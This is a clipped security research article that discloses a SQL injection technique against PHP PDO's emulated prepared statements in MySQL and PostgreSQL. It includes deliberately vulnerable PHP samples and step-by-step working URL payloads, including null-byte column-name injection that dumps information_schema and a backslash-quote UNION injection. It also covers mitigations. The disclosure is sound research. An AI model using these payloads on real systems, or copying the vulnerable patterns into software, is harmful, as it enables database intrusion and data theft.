---
title: Novel SQL Injection Technique in PDO Prepared Statements
source: https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/
author:
  - Adam Kues
published: 2025-07-21
created: 2026-02-22
description: Searchlight Cyber's Security Research team details a Novel Technique for SQL Injection in PDO's Prepared Statements.
tags:
  - clippings/articles
  - SQL-Injection
  - PHP
  - MySQL
---
# Novel SQL Injection Technique in PDO Prepared Statements

> [!summary]+
> - The article describes a novel [SQL Injection](../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/SQL%20Injection.md) technique in [PHP](../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/PHP.md) PDO's prepared statements, which often uses emulation (`PDO::ATTR_EMULATE_PREPARES` is default for MySQL).
> This technique exploits PDO's internal SQL parser, which is used to identify bindable parameters in emulated queries. The parser can be tricked into misinterpreting user input as a bound parameter, even when escaped.
>
> - For [MySQL](../Dev,%20ICT%20&%20Cybersec/Services/MySQL.md), null bytes (`%00`) within dynamically inserted SQL fragments (e.g., column names) can confuse the parser, causing `?` to be treated as a bindable parameter, leading to injection.
>
> - Older PHP versions (pre-8.4) are more susceptible due to a less robust, generic parser that mishandled backslash escaping, particularly in [PostgreSQL](../Dev,%20ICT%20&%20Cybersec/Services/PostgreSQL.md) when emulation was enabled. This allowed for trivial injection using `\'?` payloads even with proper quoting.>

^9102b3

### PHP PDO Prepared Statements 101

[PDO](../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/PHP%20PDO.md) is one of the most commonly used (if not the most common) libraries for connecting PHP services to databases.

```php
<?php
$dsn = "mysql:host=127.0.0.1;dbname=demo";
$pdo = new PDO($dsn, 'root', '');

$stmt = $pdo->prepare('SELECT id, name, sku FROM fruit WHERE name = ?');
$stmt->execute([$_GET['name']]);
$data = $stmt->fetchAll(PDO::FETCH_ASSOC);
foreach($data as $v) {
	echo join(' : ', $v) . PHP_EOL;
}
```

As you would expect from a library utilizing prepared statements, this service is safe from SQL injection.

What may surprise you, however, is exactly how PDO achieves this safety. You might reasonably assume that because it’s called `prepare` and it looks like a prepared statement, that PDO is using MySQL’s native prepared statement API here. 

However, this is not how this code is working. 

>[!important]
>**PDO emulates all prepared statements in [MySQL](../Dev,%20ICT%20&%20Cybersec/Services/MySQL.md) by default**. Unless you explicitly disable `PDO::ATTR_EMULATE_PREPARES` PDO will actually do all the escaping itself before your query even hits the database.

Naively, you might expect that the underlying pseudocode for emulating prepared statements looks something like this:

```php
for (char in stmt) {
	if (char is '?' or ':') {
		replace with escaped bound param
	}
}
```

However, this would quickly run into problems. If my statement was the following:

`SELECT * FROM users where name = ? /* TODO: refactor this ? */`

The simple logic above would see the question mark inside the comment and try and treat it as a bound parameter; this is obviously not what we wanted. PDO thus does something which may be surprising:
> it implements **its own SQL parser**

>[!warning]
>PDO does not implement a fully compliant parser, and there will be cases in which PDO misparses the statement. In fact, the PHP bug tracker is [littered with people complaining](https://bugs.php.net/bug.php?id=71885) about PDO treating question marks or colons as bound params when they shouldn’t.

The security angle for this behavior is clear – if we can trick the PDO parser into parsing our input as a bound parameter where it shouldn’t, we can get an SQLi in a situation that would otherwise be impossible. [^1]

### The Impossible SQLi

One common scenario where user input appears in a prepare statement is column and table names.

Consider the following code:

```php
<?php
$dsn = "mysql:host=127.0.0.1;dbname=demo";
$pdo = new PDO($dsn, 'root', '');

$col = '`' . str_replace('`', '``', $_GET['col']) . '`';

$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?");
$stmt->execute([$_GET['name']]);
$data = $stmt->fetchAll(PDO::FETCH_ASSOC);
foreach($data as $v) {
	echo join(' : ', $v) . PHP_EOL;
}
```

This allows the user to choose the column they return. The `col` parameter is surrounded by backticks to indicate a column name, and backticks inside the column name are escaped too to prevent injection.

You may consider a backslash to escape the column name, but this doesn’t work; **MySQL does not interpret backslashes in column names**. However, our code is being parsed by the PDO parser.

Our specific line we’re interested in is:
```
([`]([`][`]|ANYNOEOF\[`])*[`])			{ RET(PDO_PARSER_TEXT); }`
```
Where `ANYNOEOF` is defined as `[\001-\377]`. 

So what happens if we pass a null byte?

```
http://localhost:8000/?name=x&col=%00

Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`'
```

We caused an error, but we didn’t really achieve any sort of injection. What happens if we add a question mark?

```
http://localhost:8000/?name=x&col=?%00

Fatal error: Uncaught PDOException: SQLSTATE[HY093]: Invalid parameter number: number of bound variables does not match number of tokens
```

Aha! **We have injected a bound parameter that’s being interpreted by PDO!**

```sql
SELECT `?\0` FROM fruit WHERE name = ?
```

The PDO parser will first try and parse `?\0` as a column/table name. It will reach the null byte, and backtrack due to its parsing rules. Thus the backtick will instead fall back to the `SPECIALS` case, where it is ignored with `SKIP_ONE(PDO_PARSER_TEXT)`. Thus the PDO parser sees the first `?` as a bound parameter. The PDO parser will then continue to see `name = ?` as the second bound parameter, and throw an error, since we only passed one parameter and the parser expects two.

Luckily, this hurdle is easily fixed, as if we add a comment after the question mark – `?#\0` – PDO will stop parsing after our bound parameter.

```
http://localhost:8000/?name=x&col=?%23%00

Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`'x'#' at line 1
```

Our original query is now:

```sql
SELECT `?#\0` FROM fruit WHERE name = ?
```

What PDO has done is substitute the question mark that we provided with our `name` parameter, indicating our injection has been successful!

```sql
SELECT `'x'#\0` FROM fruit WHERE name = ?
```

This is where it gets its error from. We can now place a backtick in place of the `x` to escape the table name, and a comment to end the query:

```
http://localhost:8000/?name=x`%23&col=?%23%00


Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
```

We now face another problem – it may be unclear, but the error happens because a NULL byte cannot be anywhere in a MySQL comment.

we can just end the statement with a semicolon, and everything after is ignored:

```
http://localhost:8000/?name=x`;%23&col=?%23%00

Fatal error: Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column ''x' in 'field list'
```

What we have now, is a statement that looks like this:

```sql
SELECT `?#\0` FROM fruit WHERE name = ?
```

That after being prepared by PDO looks like this:

```sql
SELECT `'x`;#'#\0` FROM fruit WHERE name = ?
/* (equivalent to) SELECT `'x`; */
```

We have one more hurdle to overcome; the column name `’x` obviously does not exist. We can obviously use our injection to create a subquery, but we cannot name our column `’x`. Why not? Remember, PDO still thinks that our injection point is in a string, so `’` will be escaped in our injection to `\’`. This gives rise to our final trick – we can introduce a backslash before the `?` in the column name, so the resulting column name is `\’x`. Since we can generate the column name `\’x`, we can then inject a subquery to force MySQL not to error. Our final payload looks something like this:

```
http://localhost:8000/?name=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23&col=\?%23%00

innodb_table_stats
innodb_index_stats
CHARACTER_SETS
CHECK_CONSTRAINTS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMNS_EXTENSIONS
COLUMN_STATISTICS
EVENTS
FILES
INNODB_DATAFILES
INNODB_FOREIGN
...
```

And we can leak any data we want using a myriad of standard SQL injection techniques!

Well, our injected PDO statement looked like:

```sql
SELECT `\?#\0` FROM fruit WHERE name = ?
```

When the prepare was done, it resulted in:

 ```sql
SELECT `\'x` FROM (SELECT table_name AS `\'x` from information_schema.tables)y;#'#\0` FROM fruit WHERE name = ?
 ```

Note the inner `’x` was escaped to `\’x`, so the column matches that from the derived table `y`, and we get our injection!

It is important to be clear that this only happened because **PDO parsed our query incorrectly**. If we disable query emulation, or we instead escape `$_GET[‘name’]` manually, the code is no longer exploitable.

You may wonder if this exploitation technique applies to other database engines; from my testing in PHP 8.4:

- [MySQL](../Dev,%20ICT%20&%20Cybersec/Services/MySQL.md) is vulnerable by default to this behavior; unless explicitly setting `PDO::ATTR_EMULATE_PREPARES` to false.

- [PostgreSQL](../Dev,%20ICT%20&%20Cybersec/Services/PostgreSQL.md) is not vulnerable to this behavior by default but is vulnerable if you turn emulation on with `PDO::ATTR_EMULATE_PREPARES => true`. This is actually pretty common as emulating prepares is often seen as a performance benefit. The only difference in the attack is to use `–` comments instead of `#` comments (which are MySQL specific) and of course double quotes for tables instead of the MySQL backtick.

- SQLite emulates by default but isn’t vulnerable to this style of attack as null bytes will always cause a tokenization error.

### Other Vulnerable Scenarios

This technique is not just limited to table and column names. If you have an injection into any part of a PDO query with null bytes, you can utilize the same ideas

```php
<?php
$dsn = "mysql:host=127.0.0.1;dbname=demo";
$pdo = new PDO($dsn, 'root', '');

$sku = strtr($_GET['sku'], ["'" => "\\'", '\\' => '\\\\']);

$stmt = $pdo->prepare("SELECT * FROM fruit WHERE sku LIKE '%$sku%' AND name = ?");
$stmt->execute([$_GET['name']]);
$data = $stmt->fetchAll(PDO::FETCH_ASSOC);
foreach($data as $v) {
	echo join(' : ', $v) . PHP_EOL;
}
```

```
http://localhost:8000/mysql2.php?sku=?%00&name=apple


Fatal error: Uncaught PDOException: SQLSTATE[HY093]: Invalid parameter number: number of bound variables does not match number of tokens
```

We can proceed to exploit it in the same way. Note that the inbuilt function `$pdo->quote` escapes null bytes, and defends against this particular attack.

### Older PHP Versions are Much More Vulnerable

PHP 8.4 is actually much more resilient against these sort of attacks than older PHP versions. That is because PHP 8.4 was the first PHP version to use a [separate SQL scanner parser for each SQL dialect](https://wiki.php.net/rfc/pdo_driver_specific_parsers). In PHP 8.3 and earlier, PDO used a single parser regardless of SQL dialect

This scanner has a lot of problems. First is that it doesn’t handle the MySQL backtick at all, which means in 8.3 and earlier, if you can smuggle a `:` or `?` into a table or column name, you get an injection. No null byte is even needed.

The second, and more serious, is that every string is assumed to be backslash escaped – even in engines like Postgres that do not support backslash escaped strings.

For example, consider this code below.

```php
<?php
$dsn = "pgsql:host=127.0.0.1;dbname=demo";
$pdo = new PDO($dsn, 'demo', '', [PDO::ATTR_EMULATE_PREPARES => true]);

$sku = $pdo->quote($_GET['sku']);

$stmt = $pdo->prepare("SELECT * FROM fruit WHERE sku = $sku AND name = ?");
$stmt->execute([$_GET['name']]);
$data = $stmt->fetchAll(PDO::FETCH_ASSOC);
foreach($data as $v) {
	echo join(' : ', $v) . PHP_EOL;
}
```

There seems to be no way this could possibly be vulnerable to SQL injection.

Once you understand the PDO parser though, the solution becomes trivial; since PDO expects backslashes to escape characters, we can ‘fake out’ the PDO parser with a `\’` construction, and achieve an injection:

```sql
SELECT * FROM fruit WHERE sku = '\''?' AND name = ?
```

This is perfectly valid SQL for Postgres; however, the PDO parser falsely assumes the backslash escapes the single quote. Therefore the parser will see the string literal `’\”`, followed by a `?` outside the string literal. We can follow exactly the same steps we did in the previous examples, and get injection like this:

```
http://localhost:8000/postgres2.php?sku=\%27?--&name=UNION%20SELECT%201337,chr(33),1337,chr(33)--

1337 : ! : 1337 : !
```

[^1]: [Parser differentials](../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Confusion%20Attacks.md)
